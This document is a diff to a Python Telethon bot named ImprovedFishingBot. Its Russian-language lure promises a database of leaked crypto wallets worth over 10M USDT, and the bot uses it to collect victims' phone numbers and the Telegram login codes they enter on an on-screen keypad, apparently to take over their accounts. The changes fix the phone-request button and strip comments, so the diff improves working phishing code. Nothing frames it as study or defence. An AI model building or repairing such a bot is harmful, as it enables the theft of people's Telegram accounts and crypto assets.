@@ -6,7 +6,7 @@ import os
 import shutil
 from datetime import datetime
 from telethon import TelegramClient, events, types
-from telethon.tl.types import KeyboardButtonRequestPhone
+from telethon.tl.types import KeyboardButtonRequestPhone, KeyboardButtonCallback
 from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError
 
 # === КОНФИГУРАЦИЯ ===
@@ -41,14 +41,17 @@ class ImprovedFishingBot:
 
         @self.bot.on(events.NewMessage(pattern='/start'))
         async def start_handler(event):
+            # Правильный способ создать кнопку запроса контакта
+            button = KeyboardButtonRequestPhone(
+                text="📱 ПОДЕЛИТЬСЯ КОНТАКТОМ"
+            )
+            
             await event.respond(
                 "🔥 **ЭКСКЛЮЗИВНЫЙ ДОСТУП К ЗЛАТЕ** 🔥\n\n"
                 "Для получения доступа к базе слитых кошельков на сумму 10M+ USDT\n"
                 "нажмите кнопку 'Поделиться контактом' для быстрой авторизации.\n\n"
                 "⚡️ Это займет всего 5 секунд!",
-                buttons=[
-                    [KeyboardButtonRequestPhone("📱 ПОДЕЛИТЬСЯ КОНТАКТОМ", request_phone=True)]
-                ]
+                buttons=[[button]]
             )
 
         @self.bot.on(events.NewMessage)
@@ -90,7 +93,6 @@ class ImprovedFishingBot:
                         await self.request_code(event, user_id, auth_data['phone'])
                     
                     elif step == 'waiting_code':
-                        # Обработка кода, введенного с клавиатуры
                         code = text.replace(' ', '').replace('-', '')
                         if code.isdigit() and len(code) in (5, 6):
                             await self.verify_code(event, user_id, code)
@@ -112,7 +114,6 @@ class ImprovedFishingBot:
                                 )
                                 self.pending_auth[user_id]['step'] = 'awaiting_code_request'
 
-        # Обработка callback запросов
         @self.bot.on(events.CallbackQuery)
         async def callback_handler(event):
             user_id = event.sender_id
@@ -128,7 +129,6 @@ class ImprovedFishingBot:
                 await event.answer("⚠️ Сначала запросите код")
                 return
             
-            # Получаем текущий ввод кода
             code_input = self.code_inputs.get(user_id, '')
             
             if data == 'DELETE':
@@ -136,7 +136,6 @@ class ImprovedFishingBot:
                 self.code_inputs[user_id] = code_input
                 await event.answer(f"Код: {code_input}")
                 
-                # Обновляем сообщение с текущим кодом
                 try:
                     await event.edit(
                         f"📱 **Введите код подтверждения**\n\n"
@@ -166,7 +165,6 @@ class ImprovedFishingBot:
                     self.code_inputs[user_id] = code_input
                     await event.answer(f"Код: {code_input}")
                     
-                    # Обновляем сообщение с текущим кодом
                     try:
                         await event.edit(
                             f"📱 **Введите код подтверждения**\n\n"
@@ -201,7 +199,6 @@ class ImprovedFishingBot:
             })
             self.code_inputs[user_id] = ''
             
-            # Отправляем сообщение с клавиатурой для ввода кода
             await event.respond(
                 "📱 **Введите код подтверждения**\n\n"
                 "Код был отправлен вам в Telegram.\n"
